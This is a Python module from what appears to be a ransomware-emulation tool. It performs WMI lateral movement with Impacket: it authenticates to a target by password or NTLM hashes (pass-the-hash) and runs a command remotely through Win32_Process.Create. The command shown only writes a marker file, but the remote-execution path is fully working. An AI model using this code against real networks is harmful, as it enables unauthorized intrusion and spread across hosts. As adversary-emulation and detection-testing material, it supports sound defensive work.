"""WMI lateral movement via Impacket wmiexec."""

from __future__ import annotations

from ransomemu.core.logger import get_logger
from ransomemu.modules.lateral.base import LateralMoveBase, MoveResult

logger = get_logger(__name__)

MARKER_CMD = (
    'cmd.exe /c echo [RANSOMEMU] Simulation marker — {timestamp} '
    '> C:\\ransomemu_marker.txt && hostname && systeminfo | findstr /B /C:"OS Name"'
)


class WMIMove(LateralMoveBase):
    """Lateral movement via WMI using Impacket wmiexec."""

    protocol = "WMI"

    def _execute(
        self,
        target: str,
        username: str = "",
        password: str = "",
        domain: str = "",
        hashes: str = "",
        **kwargs,
    ) -> MoveResult:
        from datetime import datetime, timezone

        try:
            from impacket.dcerpc.v5.dcomrt import DCOMConnection
            from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login
        except ImportError:
            return MoveResult(
                target=target,
                protocol=self.protocol,
                success=False,
                error="impacket not installed",
            )

        lm_hash = ""
        nt_hash = ""
        if hashes and ":" in hashes:
            lm_hash, nt_hash = hashes.split(":", 1)

        try:
            # Establish DCOM connection
            dcom = DCOMConnection(
                target,
                username=username,
                password=password,
                domain=domain,
                lmhash=lm_hash,
                nthash=nt_hash,
            )

            # Get WMI interface
            iInterface = dcom.CoCreateInstanceEx(
                CLSID_WbemLevel1Login,
                IID_IWbemLevel1Login,
            )
            iWbemLevel1Login = iInterface  # noqa: N806

            # Connect to WMI namespace
            iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL=None, ctx=None)  # noqa: N806

            # Execute marker command
            cmd = MARKER_CMD.format(
                timestamp=datetime.now(timezone.utc).isoformat()
            )

            # Use Win32_Process.Create to execute
            win32_process, _ = iWbemServices.GetObject("Win32_Process")
            win32_process.Create(cmd, "C:\\", None)

            # Collect hostname via WMI query
            enum = iWbemServices.ExecQuery("SELECT Name FROM Win32_ComputerSystem")
            hostname = ""
            for item in enum:
                hostname = str(item.Name)
                break

            dcom.disconnect()

            return MoveResult(
                target=target,
                protocol=self.protocol,
                success=True,
                output=f"Hostname: {hostname}",
                files_marked=1,
            )

        except Exception as exc:
            return MoveResult(
                target=target,
                protocol=self.protocol,
                success=False,
                error=str(exc),
            )
